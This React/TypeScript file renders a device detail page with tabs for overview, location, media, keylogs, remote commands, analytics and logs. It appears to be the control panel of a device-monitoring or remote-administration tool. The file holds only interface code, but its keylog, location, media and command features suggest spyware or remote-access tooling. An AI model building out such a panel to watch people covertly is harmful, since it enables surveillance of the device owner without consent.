import React, { useState, useEffect } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { useDevice } from '../../hooks/useDevices';
import { DeviceHeader } from '../../components/device/DeviceHeader';
import { DeviceInfoTab } from '../../components/device/DeviceInfoTab';
import { LocationTab } from '../../components/device/LocationTab';
import { MediaTab } from '../../components/device/MediaTab';
import { KeylogTab } from '../../components/device/KeylogTab';
import { CommandTab } from '../../components/device/CommandTab';
import { LogsTab } from '../../components/device/LogsTab';
import { DeviceCharts } from '../../components/device/DeviceCharts';
import { Card } from '../../components/ui';

type TabType = 'info' | 'location' | 'media' | 'keylogs' | 'commands' | 'logs' | 'analytics';

const tabs: { id: TabType; label: string; icon: string }[] = [
  { id: 'info', label: 'Overview', icon: '📊' },
  { id: 'location', label: 'Location', icon: '📍' },
  { id: 'media', label: 'Media', icon: '📸' },
  { id: 'keylogs', label: 'Keylogs', icon: '⌨️' },
  { id: 'commands', label: 'Commands', icon: '⚡' },
  { id: 'analytics', label: 'Analytics', icon: '📈' },
  { id: 'logs', label: 'Logs', icon: '📋' },
];

export const DeviceDetail: React.FC = () => {
  const { deviceId } = useParams<{ deviceId: string }>();
  const navigate = useNavigate();
  const { device, loading, error, refresh } = useDevice(deviceId!);
  const [activeTab, setActiveTab] = useState<TabType>('info');

  useEffect(() => {
    if (!deviceId) {
      navigate('/devices');
    }
  }, [deviceId, navigate]);

  if (loading) {
    return (
      <div className="flex items-center justify-center min-h-screen">
        <div className="text-center">
          <div className="w-16 h-16 border-4 border-electric-500 border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
          <p className="text-white/60">Loading device...</p>
        </div>
      </div>
    );
  }

  if (error || !device) {
    return (
      <div className="flex items-center justify-center min-h-screen">
        <Card variant="glass" className="p-8 text-center max-w-md">
          <div className="text-6xl mb-4">⚠️</div>
          <h2 className="text-2xl font-bold text-white mb-2">Device Not Found</h2>
          <p className="text-white/60 mb-6">
            {error || 'The device you are looking for does not exist.'}
          </p>
          <button
            onClick={() => navigate('/devices')}
            className="px-6 py-2 bg-electric-500 hover:bg-electric-400 text-dark-900 rounded-lg font-medium transition-colors"
          >
            Back to Devices
          </button>
        </Card>
      </div>
    );
  }

  return (
    <div className="space-y-6">
      {/* Back Button */}
      <button
        onClick={() => navigate('/devices')}
        className="flex items-center gap-2 text-white/60 hover:text-white transition-colors"
      >
        <span className="text-xl">←</span>
        <span>Back to Devices</span>
      </button>

      {/* Device Header */}
      <DeviceHeader device={device} onRefresh={refresh} />

      {/* Tabs */}
      <div className="border-b border-white/10">
        <div className="flex gap-2 overflow-x-auto">
          {tabs.map((tab) => (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id)}
              className={`
                px-4 py-3 flex items-center gap-2 border-b-2 transition-all whitespace-nowrap
                ${
                  activeTab === tab.id
                    ? 'border-electric-500 text-electric-400'
                    : 'border-transparent text-white/60 hover:text-white hover:border-white/20'
                }
              `}
            >
              <span>{tab.icon}</span>
              <span className="font-medium">{tab.label}</span>
            </button>
          ))}
        </div>
      </div>

      {/* Tab Content */}
      <div className="pb-8">
        {activeTab === 'info' && <DeviceInfoTab device={device} />}
        {activeTab === 'location' && <LocationTab deviceId={device.id} />}
        {activeTab === 'media' && <MediaTab deviceId={device.id} />}
        {activeTab === 'keylogs' && <KeylogTab deviceId={device.id} />}
        {activeTab === 'commands' && <CommandTab deviceId={device.id} />}
        {activeTab === 'analytics' && <DeviceCharts device={device} />}
        {activeTab === 'logs' && <LogsTab deviceId={device.id} />}
      </div>
    </div>
  );
};

export default DeviceDetail;
